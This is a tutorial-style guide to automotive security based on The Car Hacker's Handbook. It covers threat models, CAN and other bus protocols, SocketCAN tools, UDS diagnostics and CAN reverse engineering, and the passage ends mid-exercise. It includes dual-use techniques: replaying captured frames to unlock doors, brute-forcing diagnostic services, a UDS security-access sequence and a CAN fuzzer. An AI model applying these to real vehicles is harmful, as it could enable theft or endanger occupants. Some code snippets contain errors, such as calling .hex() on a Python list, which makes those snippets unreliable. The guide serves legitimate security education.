# The Car Hacker's Handbook - Complete Learning Guide

**Master automotive security from threat modeling to advanced attacks**

---

## 🎯 Learning Objectives

By completing this guide, you will:
- Master automotive threat modeling methodologies
- Understand all major vehicle communication protocols
- Set up and use SocketCAN for CAN bus analysis
- Perform diagnostics and logging operations
- Reverse engineer CAN bus communications
- Hack ECUs safely in test environments
- Build automotive security test benches
- Attack embedded automotive systems
- Secure in-vehicle infotainment systems
- Understand V2V/V2X communication security
- Weaponize research findings responsibly
- Use SDR for wireless automotive attacks
- Apply security research to performance tuning

---

# Chapter 1: Understanding Threat Models 🔍

## Core Concepts

### Attack Surface Analysis
The attack surface encompasses all possible entry points for data into a vehicle:

**External Inputs:**
- Cellular communications
- Wi-Fi networks
- Bluetooth connections
- Key fob transmissions
- TPMS sensor data
- Remote services

**Internal Inputs:**
- USB/media interfaces
- OBD-II diagnostic port
- CD/DVD players
- Bluetooth pairing
- Infotainment systems

### Three-Level Threat Modeling

#### Level 0: Bird's-Eye View
Create a high-level diagram showing:
- Vehicle as central process (1.0)
- All external inputs as rectangular boxes
- Trust boundaries as dotted lines
- Information flow directions

**Key Elements:**
- Cellular → Vehicle
- Wi-Fi → Vehicle  
- Bluetooth → Vehicle
- Key Fob → Vehicle
- TPMS → Vehicle
- USB → Vehicle
- OBD-II → Vehicle

#### Level 1: Receivers
Break down the vehicle process into specific receivers:
- **1.1**: Infotainment unit
- **1.2**: Immobilizer system
- **1.3**: Engine Control Unit (ECU)
- **1.4**: TPMS receiver
- **1.5**: Gateway modules

Map which inputs connect to which receivers.

#### Level 2: Receiver Breakdown
Detail complex receivers (like infotainment):
- **Kernel Space**: Direct hardware access
  - Device drivers
  - Network stacks
  - Hardware abstraction
- **User Space**: Application level
  - Media players
  - UI applications
  - User processes

### Threat Identification

#### Level 0 Threats
High-level attack scenarios:
- Remote vehicle takeover
- Vehicle shutdown/disabling
- Occupant surveillance
- Unauthorized access
- Vehicle tracking
- Safety system compromise
- Malware installation
- Ransomware deployment

#### Level 1 & 2 Threats
Component-specific threats by attack vector:

**Cellular:**
- Remote code execution
- Man-in-the-middle attacks
- Data interception
- Service denial

**Wi-Fi:**
- Network infiltration
- Evil twin attacks
- WPA/WPA2 attacks
- DNS poisoning

**Bluetooth:**
- Unauthorized pairing
- Protocol exploits
- Audio hijacking
- Data exfiltration

### Risk Rating Systems

#### DREAD Rating System
Rate each category 1-3 (Low-High):

**Damage Potential:**
- 3: Complete system compromise
- 2: Sensitive data exposure
- 1: Minor information disclosure

**Reproducibility:**
- 3: Always reproducible
- 2: Sometimes reproducible
- 1: Difficult to reproduce

**Exploitability:**
- 3: Novice with tools
- 2: Skilled attacker
- 1: Security expert only

**Affected Users:**
- 3: All users
- 2: Some users
- 1: Very few users

**Discoverability:**
- 3: Information in public
- 2: Can figure out easily
- 1: Very difficult to discover

**Risk Score = (D + R + E + A + D) / 5**

#### CVSS Alternative
Common Vulnerability Scoring System provides:
- Base Score (vulnerability characteristics)
- Temporal Score (time-based factors)
- Environmental Score (local impact)

### Practical Exercise

**Create Your Vehicle Threat Model:**

1. **Level 0 Diagram**
   - Draw your vehicle in center
   - List all identified inputs
   - Mark trust boundaries

2. **Level 1 Mapping**
   - Research your vehicle's architecture
   - Map inputs to receivers
   - Number each receiver

3. **Threat Brainstorming**
   - List potential threats for each level
   - Be creative - think adversarially
   - Include seemingly unrealistic scenarios

4. **DREAD Scoring**
   - Rate each identified threat
   - Calculate risk scores
   - Prioritize by score and feasibility

---

# Chapter 2: Bus Protocols 🚌

## CAN Bus (Controller Area Network)

### Physical Layer

**Differential Signaling:**
- CANH (CAN High): Pin 6 on OBD-II
- CANL (CAN Low): Pin 14 on OBD-II
- Rest voltage: 2.5V on both lines
- Signal: ±1V differential (3.5V/1.5V)
- Termination: 120Ω resistors at bus ends

**Benefits:**
- Noise immunity in automotive environment
- Fault tolerance
- Electromagnetic compatibility
- Real-time operation

### CAN Packet Structure

#### Standard CAN (11-bit ID)
```
| SOF | Arbitration ID (11) | RTR | IDE | r0 | DLC (4) | Data (0-64) | CRC (15) | ACK | EOF |
```

**Fields:**
- **SOF**: Start of Frame
- **Arbitration ID**: Message identifier/priority
- **RTR**: Remote Transmission Request
- **IDE**: Identifier Extension (0 for standard)
- **DLC**: Data Length Code (0-8 bytes)
- **Data**: Payload (0-8 bytes)
- **CRC**: Cyclic Redundancy Check
- **ACK**: Acknowledgment
- **EOF**: End of Frame

#### Extended CAN (29-bit ID)
- **IDE**: Set to 1
- **SRR**: Substitute Remote Request
- **Extended ID**: Additional 18-bit identifier
- **Backward compatible** with standard CAN

### CAN Characteristics

**Broadcast Protocol:**
- All nodes see all messages
- No source authentication
- Easy to spoof other devices
- Similar to UDP networking

**Arbitration:**
- Lower ID wins collision
- Non-destructive arbitration
- Real-time priority system
- Deterministic message ordering

### Finding CAN Buses

**Voltage Detection Method:**
```bash
# Use multimeter to check voltages
# CAN: 2.5V rest, ±1V during signaling
# Look for twisted-pair wiring
```

**OBD-II Pinout:**
- Pin 6: CANH
- Pin 14: CANL
- Pin 4: Chassis ground
- Pin 5: Signal ground
- Pin 16: Battery positive (+12V)

## ISO-TP Protocol (ISO 15765-2)

### Purpose
Extend CAN's 8-byte limit to support up to 4095 bytes for:
- Diagnostic communications
- Large data transfers
- Multi-frame messaging

### Implementation
- First byte: Protocol Control Information (PCI)
- Remaining 7 bytes: Data payload
- Multiple CAN frames chained together
- Flow control between sender/receiver

### Frame Types
- **Single Frame**: Fits in one CAN frame
- **First Frame**: Start of multi-frame message
- **Consecutive Frame**: Continuation frames
- **Flow Control**: Receiver control message

## Other Protocols

### GMLAN (General Motors)
- Based on ISO-TP
- Low-speed single-wire (33.33Kbps, 32 nodes)
- High-speed dual-wire (500Kbps, 16 nodes)
- Cost-optimized architecture

### SAE J1850 Family

#### PWM (Pulse Width Modulation)
- Pins 2 & 10 (differential)
- 5V high voltage
- 41.6Kbps speed
- Used by Ford

#### VPW (Variable Pulse Width)
- Pin 2 only (single-wire)
- 7V high voltage
- 10.4Kbps speed
- Used by GM/Chrysler

### Keyword Protocols

#### KWP2000 (ISO 14230)
- Pin 7 on OBD-II
- Up to 255 bytes per message
- Two initialization variants:
  - 5-baud init (10.4Kbaud)
  - Fast init (10.4Kbaud)

#### K-Line (ISO 9141-2)
- Pin 7 primary, Pin 15 optional
- UART-like protocol
- Source/destination addressing
- Common in European vehicles

### LIN (Local Interconnect Network)
- Single master, up to 16 slaves
- 20Kbps maximum speed
- 12V single-wire
- Cost-optimized for simple devices
- Not exposed on OBD-II

### MOST (Media Oriented Systems Transport)
- Ring/star topology
- Up to 64 devices
- Three speed variants:
  - MOST25: 23Mbaud (plastic fiber)
  - MOST50: Double bandwidth (UTP)
  - MOST150: 150Mbps (Ethernet)

### FlexRay
- High-speed (up to 10Mbps)
- Time-critical applications
- TDMA (Time Division Multiple Access)
- Deterministic timing
- Safety-critical systems

## Practical Protocol Identification

### Voltage-Based Detection
```bash
# Voltage signatures for different protocols:
# CAN: 2.5V rest ±1V
# LIN: 12V
# PWM: 5V
# VPW: 7V
# K-Line: Variable
```

### OBD-II Pin Analysis
1. Check pins 6 & 14 for CAN
2. Check pin 2 for VPW/PWM
3. Check pin 7 for K-Line
4. Check pin 10 for PWM negative
5. Measure voltages during activity

---

# Chapter 3: Vehicle Communication with SocketCAN 🔌

## Setting Up SocketCAN

### Installing can-utils
```bash
# Debian/Ubuntu/Kali
sudo apt-get install can-utils

# Build from source if needed
git clone https://github.com/linux-can/can-utils.git
cd can-utils
make
sudo make install
```

### Configuring Interfaces

#### Built-in Controllers
```bash
# Load kernel modules
sudo modprobe can
sudo modprobe can_raw
sudo modprobe can_bcm
sudo modprobe vcan

# Bring up interface
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0
```

#### USB/Serial CAN Devices
```bash
# SLCAN (Serial Line CAN)
sudo slcand -o -c -s6 /dev/ttyUSB0 can0
sudo ip link set up can0

# Common bitrate settings:
# -s0 = 10Kbps
# -s1 = 20Kbps  
# -s4 = 125Kbps
# -s6 = 500Kbps
# -s8 = 1Mbps
```

#### Virtual CAN Networks
```bash
# Create virtual CAN interface
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Verify interface
ip link show vcan0
```

## CAN Utilities Suite

### Core Tools

#### candump - CAN Frame Capture
```bash
# Basic capture
candump can0

# Log to file
candump -l can0

# Filter specific IDs
candump can0,123:7FF

# Human readable timestamps
candump -t A can0

# Color output
candump -c can0
```

#### cansend - Send CAN Frames
```bash
# Send single frame
cansend can0 123#DEADBEEF

# Extended frame
cansend can0 12345678#DEADBEEFCAFEBABE

# RTR frame
cansend can0 123#R

# Error frame
cansend can0 123#E
```

#### cansniffer - Traffic Analysis
```bash
# Monitor and highlight changes
cansniffer -c can0

# Binary diff mode
cansniffer -c -x can0

# Filter specific IDs
cansniffer can0,123:7FF
```

#### canplayer - Replay Logs
```bash
# Replay captured log
canplayer -I logfile.log

# Replay with timing
canplayer -t -I logfile.log

# Loop playback
canplayer -l I logfile.log
```

#### isotptun - ISO-TP Tunnel
```bash
# Create ISO-TP tunnel
isotptun -s 123 -d 456 -i can0

# Tunnel IP over CAN
isotptun -s 123 -d 456 -i can0 tun0
```

### Advanced Tools

#### cangen - Generate Test Traffic
```bash
# Generate random frames
cangen can0

# Specific ID range
cangen -I 100 can0

# Fixed data pattern
cangen -D DEADBEEF can0

# Specific interval
cangen -g 1000 can0  # 1 second
```

#### cansequence - Sequence Analysis
```bash
# Analyze message sequences
cansequence -r can0

# Check for missing frames
cansequence -d can0
```

## Practical CAN Analysis

### Basic Sniffing Workflow
```bash
# 1. Set up interface
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# 2. Start capture
candump -l can0 &

# 3. Perform action in vehicle
# (e.g., unlock doors)

# 4. Stop capture
kill %1

# 5. Analyze log
less candump-*.log
```

### Traffic Analysis Techniques

#### Baseline Recording
```bash
# Record normal operation
candump -L can0 > baseline.log

# Record during specific action
candump -L can0 > action.log

# Compare differences
diff baseline.log action.log
```

#### Message Filtering
```bash
# Filter by ID range
candump can0,100:200

# Exclude specific IDs
candump can0 | grep -v "123\|456"

# Monitor changes only
cansniffer -c can0
```

#### Binary Analysis
```bash
# Show binary representation
candump -x can0

# Hex dump format
candump -H can0

# ASCII interpretation
candump -A can0
```

## SocketCAN Programming

### C Programming Interface

#### Basic Socket Setup
```c
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

int socket_fd;
struct sockaddr_can addr;
struct can_frame frame;

// Create socket
socket_fd = socket(PF_CAN, SOCK_RAW, CAN_RAW);

// Bind to interface
strcpy(ifr.ifr_name, "can0");
ioctl(socket_fd, SIOCGIFINDEX, &ifr);
addr.can_ifindex = ifr.ifr_ifindex;
addr.can_family = AF_CAN;
bind(socket_fd, (struct sockaddr *)&addr, sizeof(addr));
```

#### Sending CAN Frames
```c
// Prepare frame
frame.can_id = 0x123;
frame.can_dlc = 8;
frame.data[0] = 0xDE;
frame.data[1] = 0xAD;
frame.data[2] = 0xBE;
frame.data[3] = 0xEF;

// Send frame
write(socket_fd, &frame, sizeof(struct can_frame));
```

#### Receiving CAN Frames
```c
// Read frame
nbytes = read(socket_fd, &frame, sizeof(struct can_frame));

// Process frame
printf("ID: %X DLC: %d Data: ", frame.can_id, frame.can_dlc);
for (int i = 0; i < frame.can_dlc; i++) {
    printf("%02X ", frame.data[i]);
}
printf("\n");
```

### Python Programming

#### Using python-can
```python
import can

# Create bus interface
bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Send message
msg = can.Message(arbitration_id=0x123, 
                 data=[0xDE, 0xAD, 0xBE, 0xEF],
                 is_extended_id=False)
bus.send(msg)

# Receive messages
for msg in bus:
    print(f"ID: {msg.arbitration_id:X} Data: {msg.data.hex()}")
```

## Practical Exercises

### Exercise 1: Virtual CAN Setup
```bash
# 1. Create virtual interface
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# 2. Start sniffer in one terminal
candump vcan0

# 3. Send test frames in another terminal
cansend vcan0 123#DEADBEEF
cansend vcan0 456#CAFEBABE

# 4. Observe frames in sniffer terminal
```

### Exercise 2: Traffic Generation and Analysis
```bash
# Generate test traffic
cangen -g 100 vcan0 &  # Every 100ms

# Analyze in another terminal
cansniffer -c vcan0

# Stop generator
kill %1
```

### Exercise 3: Record and Replay
```bash
# Record traffic
candump -L vcan0 > test.log &
cangen -n 100 vcan0  # Generate 100 frames
kill %1

# Replay traffic
canplayer -I test.log
```

---

# Chapter 4: Diagnostics and Logging 🔧

## Diagnostic Trouble Codes (DTCs)

### DTC Format

#### Generic OBD-II DTCs
Format: `PXXXX`

**First Character (Powertrain):**
- P: Powertrain
- B: Body
- C: Chassis  
- U: Network

**Second Character:**
- 0: Generic (SAE defined)
- 1: Manufacturer specific

**Third Character (Subsystem):**
- 1: Fuel/Air metering
- 2: Fuel/Air metering (injector circuit)
- 3: Ignition system
- 4: Auxiliary emission controls
- 5: Vehicle speed/idle control
- 6: Computer/auxiliary outputs
- 7: Transmission
- 8: Transmission

#### Example DTCs
- **P0301**: Cylinder 1 Misfire Detected
- **P0420**: Catalyst System Efficiency Below Threshold
- **P0171**: System Too Lean (Bank 1)
- **B1234**: Manufacturer-specific body code

### Reading DTCs

#### Using OBD-II Tools
```bash
# With ELM327-compatible interface
echo "03" | socat - /dev/ttyUSB0,b38400

# Expected response format:
# 43 01 P0301  (43 = response, 01 = number of codes, P0301 = DTC)
```

#### Scan Tool Commands
- **Mode 03**: Request stored DTCs
- **Mode 07**: Request pending DTCs  
- **Mode 0A**: Request permanent DTCs
- **Mode 04**: Clear DTCs

## Unified Diagnostic Services (UDS)

### UDS over ISO-TP

UDS provides standardized diagnostic services over CAN using ISO-TP transport.

#### Service Types

**Diagnostic Session Control (0x10):**
```
Request:  10 01        # Default session
Request:  10 02        # Programming session  
Request:  10 03        # Extended session
Response: 50 01        # Positive response
```

**ECU Reset (0x11):**
```
Request:  11 01        # Hard reset
Request:  11 02        # Key off/on reset
Request:  11 03        # Soft reset
Response: 51 01        # Positive response
```

**Security Access (0x27):**
```
Request:  27 01        # Request seed
Response: 67 01 AB CD  # Seed = ABCD
Request:  27 02 12 34  # Send key = 1234
Response: 67 02        # Access granted
```

**Read Data by ID (0x22):**
```
Request:  22 F1 90     # Read VIN
Response: 62 F1 90 [17 bytes VIN data]
```

**Write Data by ID (0x2E):**
```
Request:  2E F1 90 [new data]
Response: 6E F1 90     # Write successful
```

#### Negative Responses
```
Format: 7F [Service] [NRC]

Common NRCs:
- 10: General reject
- 11: Service not supported
- 12: Subfunction not supported  
- 13: Incorrect message length
- 22: Conditions not correct
- 33: Security access denied
- 35: Invalid key
- 36: Exceed number of attempts
```

### Practical UDS Examples

#### Basic ECU Information
```bash
# Using isotp-utils
echo "22 F1 90" | isotpsend -s 0x7E0 -d 0x7E8 can0
# Response: 62 F1 90 [VIN data]

# Read software version
echo "22 F1 94" | isotpsend -s 0x7E0 -d 0x7E8 can0
# Response: 62 F1 94 [version data]
```

#### Security Access Sequence
```bash
# 1. Start extended session
echo "10 03" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 2. Request seed
echo "27 01" | isotpsend -s 0x7E0 -d 0x7E8 can0
# Response: 67 01 [seed bytes]

# 3. Calculate key (manufacturer-specific algorithm)
# key = calculate_key(seed)

# 4. Send key
echo "27 02 [key bytes]" | isotpsend -s 0x7E0 -d 0x7E8 can0
# Response: 67 02 (success) or 7F 27 35 (invalid key)
```

## Diagnostic Mode Brute-forcing

### Safe Brute-forcing Techniques

#### PID Discovery
```bash
#!/bin/bash
# Discover supported PIDs
for pid in $(seq 0 255); do
    printf "22 %02X 00\n" $pid | isotpsend -s 0x7E0 -d 0x7E8 can0
    sleep 0.1  # Rate limiting
done
```

#### Service Discovery
```bash
#!/bin/bash
# Discover supported services
for service in $(seq 0 255); do
    printf "%02X 00\n" $service | isotpsend -s 0x7E0 -d 0x7E8 can0
    sleep 0.1
done
```

### Rate Limiting and Safety

**Important Guidelines:**
- Never brute-force on production vehicles
- Use appropriate delays between requests
- Monitor for negative responses
- Stop on repeated security access denials
- Use isolated test environments

## Keeping Diagnostic Sessions Active

### Session Management

#### Tester Present (0x3E)
```bash
# Send periodic tester present
while true; do
    echo "3E 00" | isotpsend -s 0x7E0 -d 0x7E8 can0
    sleep 2  # Send every 2 seconds
done
```

#### Automated Session Maintenance
```python
import can
import time
import threading

def tester_present(bus, source, dest):
    """Send periodic tester present messages"""
    msg = can.Message(
        arbitration_id=source,
        data=[0x02, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
        is_extended_id=False
    )
    
    while True:
        bus.send(msg)
        time.sleep(2)

# Start tester present thread
bus = can.interface.Bus('can0', bustype='socketcan')
tp_thread = threading.Thread(target=tester_present, args=(bus, 0x7E0, 0x7E8))
tp_thread.daemon = True
tp_thread.start()
```

## Event Data Recorder (EDR) Analysis

### EDR Data Types

**Pre-crash Data:**
- Vehicle speed
- Engine RPM
- Throttle position
- Brake status
- Steering angle
- Seatbelt status

**Crash Data:**
- Impact severity
- Airbag deployment
- Crash duration
- Delta-V calculations

### Legal and Ethical Considerations

**Important Notes:**
- EDR data may be legally protected
- Obtain proper authorization before accessing
- Understand privacy implications
- Follow local laws and regulations
- Document chain of custody

### EDR Access Methods

#### Diagnostic Commands
```bash
# Manufacturer-specific EDR read commands
# (Examples - actual commands vary by manufacturer)

# GM EDR read
echo "AA 00" | isotpsend -s 0x7E0 -d 0x7E8 can0

# Ford EDR read  
echo "B1 00" | isotpsend -s 0x7E0 -d 0x7E8 can0
```

## Practical Diagnostic Exercises

### Exercise 1: Basic OBD-II Communication
```bash
# 1. Connect to OBD-II port with ELM327
# 2. Initialize connection
echo "ATZ" | socat - /dev/ttyUSB0,b38400

# 3. Read supported PIDs
echo "01 00" | socat - /dev/ttyUSB0,b38400

# 4. Read engine RPM
echo "01 0C" | socat - /dev/ttyUSB0,b38400

# 5. Read vehicle speed
echo "01 0D" | socat - /dev/ttyUSB0,b38400
```

### Exercise 2: UDS Session Management
```bash
# 1. Start extended diagnostic session
echo "10 03" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 2. Read ECU information
echo "22 F1 90" | isotpsend -s 0x7E0 -d 0x7E8 can0  # VIN
echo "22 F1 A0" | isotpsend -s 0x7E0 -d 0x7E8 can0  # Part number

# 3. Maintain session with tester present
echo "3E 00" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 4. End session
echo "10 01" | isotpsend -s 0x7E0 -d 0x7E8 can0
```

### Exercise 3: Safe PID Discovery
```bash
#!/bin/bash
# Safe PID enumeration script

ECU_TX=0x7E0
ECU_RX=0x7E8
DELAY=0.2

echo "Discovering supported PIDs..."

for pid in $(seq 0 50); do  # Limited range for safety
    printf "Testing PID %02X\n" $pid
    response=$(printf "22 %02X 00\n" $pid | isotpsend -s $ECU_TX -d $ECU_RX can0 2>/dev/null)
    
    if [[ $response != *"7F"* ]]; then
        printf "PID %02X: Supported\n" $pid
    fi
    
    sleep $DELAY
done
```

---

# Chapter 5: Reverse Engineering the CAN Bus 🔍

## Methodology Overview

Reverse engineering automotive CAN traffic requires systematic analysis to identify:
- Message purposes and functions  
- Data field meanings
- State machines and protocols
- Security mechanisms
- Error conditions

## Record and Replay Analysis

### Basic Workflow

#### 1. Baseline Recording
```bash
# Record normal vehicle operation
candump -L can0 > baseline.log

# Let vehicle idle for known period
# Record typical operational messages
```

#### 2. Action Recording  
```bash
# Record during specific action
candump -L can0 > door_unlock.log

# Perform single action (e.g., unlock doors)
# Keep recording window narrow
```

#### 3. Replay Testing
```bash
# Test replay of recorded action
canplayer -I door_unlock.log

# Verify action was reproduced
# If not successful, adjust recording window
```

#### 4. Isolate Critical Messages
```bash
# Compare baseline vs action
diff baseline.log door_unlock.log > differences.txt

# Identify candidate messages
grep "^>" differences.txt  # Messages only in action log
```

### Binary Search Method

When multiple messages are captured, use binary search to isolate the minimum required frames:

```bash
#!/bin/bash
# Binary search script for message isolation

LOG_FILE="door_unlock.log"
TOTAL_LINES=$(wc -l < $LOG_FILE)
START=1
END=$TOTAL_LINES

while [ $START -lt $END ]; do
    MID=$(( (START + END) / 2 ))
    
    # Create test file with first half
    head -n $MID $LOG_FILE > test_half.log
    
    echo "Testing first $MID lines..."
    
    # Replay and test
    canplayer -I test_half.log
    
    echo "Did the action work? (y/n): "
    read response
    
    if [ "$response" = "y" ]; then
        END=$MID
        echo "Action worked, focusing on first half"
    else
        START=$(( MID + 1 ))
        echo "Action failed, focusing on second half"
    fi
done

echo "Critical message is at line $START"
sed -n "${START}p" $LOG_FILE
```

## Traffic Analysis Techniques

### Message Classification

#### Periodic vs Event-Driven
```bash
# Identify periodic messages
candump can0 | awk '{print $3}' | sort | uniq -c | sort -nr

# High occurrence count = likely periodic
# Low occurrence count = likely event-driven
```

#### Message Frequency Analysis
```bash
# Analyze message timing patterns
candump -t A can0 | awk '{
    id = $3
    gsub(/\(|\)/, "", $1)
    time = $1
    if (prev_time[id]) {
        interval = time - prev_time[id]
        intervals[id] = intervals[id] " " interval
    }
    prev_time[id] = time
} END {
    for (id in intervals) {
        print id ": " intervals[id]
    }
}'
```

### Data Analysis Methods

#### Bit-Level Analysis
```bash
# Monitor specific arbitration ID for changes
cansniffer -c can0,123:7FF

# Look for:
# - Single bit toggles (boolean states)
# - Multi-bit counters (incrementing values)  
# - Data patterns (ASCII, packed decimals)
```

#### Statistical Analysis
```python
import re
import collections

def analyze_can_data(log_file):
    """Analyze CAN data patterns"""
    
    messages = collections.defaultdict(list)
    
    with open(log_file, 'r') as f:
        for line in f:
            # Parse: (timestamp) interface id#data
            match = re.match(r'\(([\d.]+)\) (\w+) ([0-9A-F]+)#([0-9A-F]*)', line)
            if match:
                timestamp, interface, msg_id, data = match.groups()
                messages[msg_id].append({
                    'timestamp': float(timestamp),
                    'data': data,
                    'bytes': [data[i:i+2] for i in range(0, len(data), 2)]
                })
    
    # Analyze each message ID
    for msg_id, frames in messages.items():
        print(f"\nMessage ID: {msg_id}")
        print(f"Frame count: {len(frames)}")
        
        if len(frames) > 1:
            # Check for changing bytes
            for byte_pos in range(len(frames[0]['bytes'])):
                values = [f['bytes'][byte_pos] for f in frames if byte_pos < len(f['bytes'])]
                unique_values = set(values)
                
                if len(unique_values) > 1:
                    print(f"  Byte {byte_pos}: {len(unique_values)} different values")
                    if len(unique_values) <= 10:
                        print(f"    Values: {sorted(unique_values)}")
```

### Protocol Pattern Recognition

#### State Machine Identification
```python
def find_state_patterns(messages, msg_id):
    """Look for state machine patterns in message data"""
    
    if msg_id not in messages:
        return
    
    frames = messages[msg_id]
    
    # Look for repeating patterns
    patterns = []
    for i in range(len(frames) - 3):
        pattern = [f['data'] for f in frames[i:i+4]]
        patterns.append(tuple(pattern))
    
    # Find most common 4-frame patterns
    pattern_counts = collections.Counter(patterns)
    
    print(f"Common patterns for {msg_id}:")
    for pattern, count in pattern_counts.most_common(5):
        if count > 1:
            print(f"  Pattern (count {count}): {' -> '.join(pattern)}")
```

## Advanced Analysis Techniques

### Correlation Analysis

#### Multi-Signal Correlation
```python
def correlate_signals(messages, time_window=0.1):
    """Find signals that change together"""
    
    # Get all message changes within time windows
    all_changes = []
    
    for msg_id, frames in messages.items():
        for i in range(1, len(frames)):
            if frames[i]['data'] != frames[i-1]['data']:
                all_changes.append({
                    'timestamp': frames[i]['timestamp'],
                    'msg_id': msg_id,
                    'old_data': frames[i-1]['data'],
                    'new_data': frames[i]['data']
                })
    
    # Sort by timestamp
    all_changes.sort(key=lambda x: x['timestamp'])
    
    # Find correlated changes
    correlations = []
    for i, change in enumerate(all_changes):
        correlated = []
        
        # Look for other changes within time window
        for j in range(i+1, len(all_changes)):
            time_diff = all_changes[j]['timestamp'] - change['timestamp']
            if time_diff > time_window:
                break
            correlated.append(all_changes[j])
        
        if correlated:
            correlations.append({
                'primary': change,
                'correlated': correlated
            })
    
    return correlations
```

#### Physical Action Correlation
```bash
#!/bin/bash
# Correlate CAN messages with physical actions

# 1. Record baseline
echo "Recording baseline - keep vehicle still"
candump -t A can0 > baseline.log &
PID=$!
sleep 10
kill $PID

# 2. Record during action
echo "Recording during door unlock - press unlock now"
candump -t A can0 > unlock.log &
PID=$!
sleep 5
kill $PID

# 3. Find differences
echo "Analyzing differences..."
python3 -c "
import sys
baseline = set(open('baseline.log').readlines())
unlock = set(open('unlock.log').readlines())
unique_to_unlock = unlock - baseline
for line in sorted(unique_to_unlock):
    print(line.strip())
"
```

### Fuzzing Approach

#### Safe Message Fuzzing
```python
import can
import time
import random

def safe_fuzz_message(bus, base_id, base_data, fuzz_positions):
    """Safely fuzz specific positions in a CAN message"""
    
    print(f"Fuzzing ID {base_id:03X}, positions {fuzz_positions}")
    
    for iteration in range(100):  # Limited iterations
        fuzzed_data = list(base_data)
        
        # Fuzz only specified positions
        for pos in fuzz_positions:
            if pos < len(fuzzed_data):
                fuzzed_data[pos] = random.randint(0, 255)
        
        # Send fuzzed message
        msg = can.Message(
            arbitration_id=base_id,
            data=fuzzed_data,
            is_extended_id=False
        )
        
        try:
            bus.send(msg)
            print(f"Sent: {base_id:03X}#{fuzzed_data.hex().upper()}")
            time.sleep(0.1)  # Rate limiting
            
        except Exception as e:
            print(f"Error sending: {e}")
            break
```

## Practical Reverse Engineering

### Door Lock Analysis Example

#### Step 1: Record Lock/Unlock Sequence
```bash
# Record door lock action
echo "Press lock button in 3 seconds..."
sleep 3
candump -t A can0 > lock_action.log &
PID=$!
# Press physical lock button
sleep 2
kill $PID

# Record door unlock action  
echo "Press unlock button in 3 seconds..."
sleep 3
candump -t A can0 > unlock_action.log &
PID=$!
# Press physical unlock button
sleep 2
kill $PID
```

#### Step 2: Identify Candidate Messages
```python
def find_lock_unlock_differences():
    """Compare lock vs unlock logs"""
    
    def parse_log(filename):
        messages = {}
        with open(filename, 'r') as f:
            for line in f:
                if '#' in line:
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        timestamp = parts[0].strip('()')
                        msg_id = parts[2].split('#')[0]
                        data = parts[2].split('#')[1] if '#' in parts[2] else ''
                        
                        if msg_id not in messages:
                            messages[msg_id] = []
                        messages[msg_id].append(data)
        return messages
    
    lock_msgs = parse_log('lock_action.log')
    unlock_msgs = parse_log('unlock_action.log')
    
    # Find IDs present in both logs
    common_ids = set(lock_msgs.keys()) & set(unlock_msgs.keys())
    
    for msg_id in common_ids:
        lock_data = set(lock_msgs[msg_id])
        unlock_data = set(unlock_msgs[msg_id])
        
        # Look for data unique to each action
        lock_only = lock_data - unlock_data
        unlock_only = unlock_data - lock_data
        
        if lock_only or unlock_only:
            print(f"ID {msg_id}:")
            if lock_only:
                print(f"  Lock only: {lock_only}")
            if unlock_only:
                print(f"  Unlock only: {unlock_only}")

find_lock_unlock_differences()
```

#### Step 3: Test Hypotheses
```bash
# Test suspected lock message
cansend can0 123#DEADBEEF12345678

# Test suspected unlock message  
cansend can0 123#CAFEBABE87654321

# Verify physical action occurred
```

#### Step 4: Bit-Level Analysis
```python
def analyze_bit_differences(lock_data, unlock_data):
    """Find specific bit differences between lock/unlock"""
    
    if len(lock_data) != len(unlock_data):
        print("Data length mismatch")
        return
    
    lock_bytes = bytes.fromhex(lock_data)
    unlock_bytes = bytes.fromhex(unlock_data)
    
    for i, (lock_byte, unlock_byte) in enumerate(zip(lock_bytes, unlock_bytes)):
        if lock_byte != unlock_byte:
            print(f"Byte {i}: Lock={lock_byte:02X} ({lock_byte:08b}), "
                  f"Unlock={unlock_byte:02X} ({unlock_byte:08b})")
            
            # Find different bits
            xor_result = lock_byte ^ unlock_byte
            for bit in range(8):
                if xor_result & (1 << bit):
                    print(f"  Bit {bit} differs")

# Example usage
analyze_bit_differences("DEADBEEF", "DEADBEAF")  # Only bit 4 of byte 3 differs
```

## Security Analysis

### Authentication Detection

#### Challenge-Response Patterns
```python
def detect_auth_patterns(messages, msg_id):
    """Look for challenge-response authentication patterns"""
    
    frames = messages.get(msg_id, [])
    
    # Look for patterns like:
    # 1. Request with incrementing counter
    # 2. Response with related data
    # 3. Confirmation message
    
    potential_challenges = []
    potential_responses = []
    
    for i, frame in enumerate(frames):
        data_bytes = bytes.fromhex(frame['data'])
        
        # Check if first bytes look like counters
        if len(data_bytes) >= 2:
            counter_candidate = (data_bytes[0] << 8) | data_bytes[1]
            
            # Look for incrementing pattern
            if i > 0:
                prev_data = bytes.fromhex(frames[i-1]['data'])
                if len(prev_data) >= 2:
                    prev_counter = (prev_data[0] << 8) | prev_data[1]
                    
                    if counter_candidate == prev_counter + 1:
                        potential_challenges.append({
                            'index': i,
                            'counter': counter_candidate,
                            'data': frame['data']
                        })
    
    return potential_challenges
```

#### Rolling Code Detection
```python
def detect_rolling_codes(messages, msg_id):
    """Detect rolling code patterns (common in key fobs)"""
    
    frames = messages.get(msg_id, [])
    
    if len(frames) < 3:
        return None
    
    # Extract potential code fields
    code_positions = []
    
    for pos in range(0, min(8, len(frames[0]['data'])//2)):
        values = []
        for frame in frames:
            data_bytes = bytes.fromhex(frame['data'])
            if pos < len(data_bytes):
                values.append(data_bytes[pos])
        
        # Check if values never repeat (rolling code characteristic)
        if len(set(values)) == len(values) and len(values) > 2:
            code_positions.append({
                'position': pos,
                'values': values,
                'pattern': 'rolling'
            })
    
    return code_positions
```

## Practical Exercises

### Exercise 1: Basic Message Identification
```bash
# 1. Set up monitoring
candump can0 > all_traffic.log &
PID=$!

# 2. Perform various actions
echo "Turn on headlights now"
sleep 3
echo "Turn on turn signal now" 
sleep 3
echo "Press brake pedal now"
sleep 3

# 3. Stop monitoring
kill $PID

